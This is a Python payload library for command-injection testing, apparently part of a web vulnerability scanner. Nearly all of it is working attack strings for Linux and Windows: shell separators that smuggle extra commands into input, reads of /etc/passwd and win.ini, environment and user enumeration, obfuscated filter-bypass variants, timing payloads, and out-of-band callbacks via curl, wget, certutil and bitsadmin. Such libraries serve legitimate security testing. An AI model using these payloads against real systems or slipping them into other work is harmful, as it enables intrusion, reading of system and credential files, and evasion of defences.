"""
CMDi payload library — P2 upgrade: 80+ payloads, Linux + Windows.
"""
from typing import List

ECHO_PAYLOADS_LINUX: List[str] = [
    "; echo {token}",
    "| echo {token}",
    "&& echo {token}",
    "|| echo {token}",
    "`echo {token}`",
    "$(echo {token})",
    "; echo ${token}",
    "| echo ${token}",
    "; printf '{token}'",
    "| printf '{token}'",
]

GENERIC_PAYLOADS: List[str] = [
    "; whoami",
    "| whoami",
    "&& whoami",
    "; id",
    "| id",
    "; uname -a",
    "| uname -a",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ls -la",
    "| ls -la",
    "; pwd",
    "; hostname",
    "; env",
    "; ifconfig",
    "| ifconfig",
    "; ip addr",
    "; netstat -an",
    "; ps aux",
    "; wget http://{oob_url}",
    "; curl http://{oob_url}",
    "| curl http://{oob_url}",
    "; nslookup {oob_domain}",
    "| nslookup {oob_domain}",
    "; ping -c 1 {oob_domain}",
    "| ping -c 1 {oob_domain}",
]

TIME_PAYLOADS_LINUX: List[str] = [
    "; sleep {delay}",
    "| sleep {delay}",
    "&& sleep {delay}",
    "|| sleep {delay}",
    "`sleep {delay}`",
    "$(sleep {delay})",
    "; /bin/sleep {delay}",
    "| /bin/sleep {delay}",
]

WAF_BYPASS_PAYLOADS: List[str] = [
    "; e'c'h'o {token}",
    "| e'c'h'o {token}",
    "; echo${IFS}{token}",
    "| echo${IFS}{token}",
    "; cat</etc/passwd",
    "| cat</etc/passwd",
    "; {cmd,}",
    "; $(printf '%s%s' wh oami)",
    "; /???/c?t /???/p?sswd",
    "; ec`echo h`o {token}",
    "; e\"c\"h\"o {token}",
    "| e\"c\"h\"o {token}",
    "; e\\c\\h\\o {token}",
    "; e''c''h''o {token}",
    "$(echo {token})",
]

# Windows-specific payloads
WINDOWS_ECHO_PAYLOADS: List[str] = [
    "& echo {token}",
    "| echo {token}",
    "&& echo {token}",
    "|| echo {token}",
    "& echo %{token}%",
    "& cmd /c echo {token}",
    "& type C:\\Windows\\win.ini",
    "& dir C:\\",
    "& whoami",
    "& ipconfig",
    "& net user",
    "& systeminfo",
    "& ping -n 5 127.0.0.1",
    "& timeout /t 5",
]

WINDOWS_TIME_PAYLOADS: List[str] = [
    "& ping -n {delay_plus_1} 127.0.0.1",
    "& timeout /t {delay}",
    "& ping 127.0.0.1 -n {delay_plus_1}",
]

# OOB payloads
OOB_PAYLOADS: List[str] = [
    "; curl {callback_url}",
    "; wget {callback_url}",
    "; nslookup {token}.{dns_domain}",
    "; ping -c 1 {token}.{dns_domain}",
    "| curl {callback_url}",
    "| wget -q -O- {callback_url}",
    "&& curl {callback_url}",
    "|| curl {callback_url}",
    "`curl {callback_url}`",
    "$(curl {callback_url})",
    # Windows
    "& certutil -urlcache -f {callback_url} nul",
    "& bitsadmin /transfer job /download /priority high {callback_url} nul",
    "& curl {callback_url}",
]


def build_echo_payloads(token: str, platform: str = "linux") -> List[str]:
    """Generate echo payloads with the given token."""
    if platform == "windows":
        payloads = []
        for p in WINDOWS_ECHO_PAYLOADS:
            payloads.append(p.replace("{token}", token))
        return payloads
    return [p.format(token=token) for p in ECHO_PAYLOADS_LINUX]


def build_time_payloads(delay: int, platform: str = "linux") -> List[str]:
    """Generate time-based payloads."""
    if platform == "windows":
        payloads = []
        for p in WINDOWS_TIME_PAYLOADS:
            payloads.append(p.replace("{delay}", str(delay)).replace("{delay_plus_1}", str(delay + 1)))
        return payloads
    return [p.format(delay=delay) for p in TIME_PAYLOADS_LINUX]


def build_oob_payloads(callback_url_or_token: str, mode: str = "http") -> List[str]:
    """Generate OOB payloads."""
    if mode == "http":
        return [p.format(callback_url=callback_url_or_token) for p in OOB_PAYLOADS[:8]]
    else:
        return [p.format(token=callback_url_or_token, dns_domain="oob.wvs.local") for p in OOB_PAYLOADS if "dns" in p or "ping" in p]
